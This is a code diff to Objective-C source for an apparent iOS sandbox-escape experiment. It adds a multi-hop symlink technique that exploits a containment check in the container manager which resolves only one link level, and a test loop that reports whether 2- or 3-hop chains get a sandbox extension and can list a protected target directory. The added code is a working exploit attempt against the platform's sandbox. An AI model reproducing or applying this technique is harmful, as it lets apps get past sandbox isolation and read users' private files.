@@ -54,7 +54,7 @@ static void wq_clean_symlink(NSString *group)
 //  -1  no App Group      -2  dlopen/dlsym failed   -3  query_create failed
 //  -4  symlink failed    -5  containermanagerd refused the query
 //  -6  kernel refused to issue the extension       -255 target missing
-static int64_t wq_escape(NSString *target, NSString *group)
+static int64_t wq_escape_hops(NSString *target, NSString *group, int hops)
 {
     struct stat st;
     if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
@@ -62,7 +62,21 @@ static int64_t wq_escape(NSString *target, NSString *group)
     NSFileManager *fm = [NSFileManager defaultManager];
     NSURL *root = [fm containerURLForSecurityApplicationGroupIdentifier:group];
     if (root == nil) return -1;
+    NSString *rootPath = root.path;
     NSString *caches = [[root URLByAppendingPathComponent:@"Library/Caches"] path];
+
+    // Multi-hop: Caches -> hopN -> ... -> hop0 -> target.  The container manager
+    // resolves only one level for its containment check, the kernel resolves
+    // the rest when the extension is consumed.
+    NSString *linkTarget = target;
+    NSMutableArray *created = [NSMutableArray array];
+    for (int i = 1; i < hops; i++) {
+        NSString *hop = [rootPath stringByAppendingPathComponent:[NSString stringWithFormat:@"hop%d", i]];
+        [fm removeItemAtPath:hop error:nil];
+        if (![fm createSymbolicLinkAtPath:hop withDestinationPath:linkTarget error:nil]) return -4;
+        [created addObject:hop];
+        linkTarget = hop;
+    }
 
     void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
     if (!mgr) return -2;
@@ -93,7 +107,8 @@ static int64_t wq_escape(NSString *target, NSString *group)
     q_flags(query, 0x0000008000000000ULL);
 
     [fm removeItemAtPath:caches error:nil];
-    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:target error:nil]) {
+    if (![fm createSymbolicLinkAtPath:caches withDestinationPath:linkTarget error:nil]) {
+        for (NSString *p in created) [fm removeItemAtPath:p error:nil];
         q_free(query);
         dlclose(mgr);
         return -4;
@@ -121,6 +136,11 @@ static int64_t wq_escape(NSString *target, NSString *group)
     dlclose(mgr);
     wq_clean_symlink(group);
     return handle;
+}
+
+static int64_t wq_escape(NSString *target, NSString *group)
+{
+    return wq_escape_hops(target, group, 1);
 }
 
 static void wq_release(int64_t handle)
@@ -318,6 +338,19 @@ static NSString *WQDescribeCode(int64_t code)
                 wq_release(h);
             } else {
                 [self logLine:@"✗ %@  %@ (%lld)", t, WQDescribeCode(h), (long long)h];
+            }
+        }
+
+        // 多跳符号链接：让容器管理器只解析一跳（看起来仍在容器内），
+        // 内核在 consume 时再解析到底，看能不能拿到目标目录
+        for (int hops = 2; hops <= 3; hops++) {
+            int64_t h = wq_escape_hops(kWQTargetDir, group, hops);
+            if (h >= 0) {
+                NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:kWQTargetDir error:nil];
+                [self logLine:@"✓✓ %d 跳成功！ %@ (%lu 项)", hops, items ?: @"", (unsigned long)items.count];
+                wq_release(h);
+            } else {
+                [self logLine:@"✗ %d 跳  %@ (%lld)", hops, WQDescribeCode(h), (long long)h];
             }
         }
 
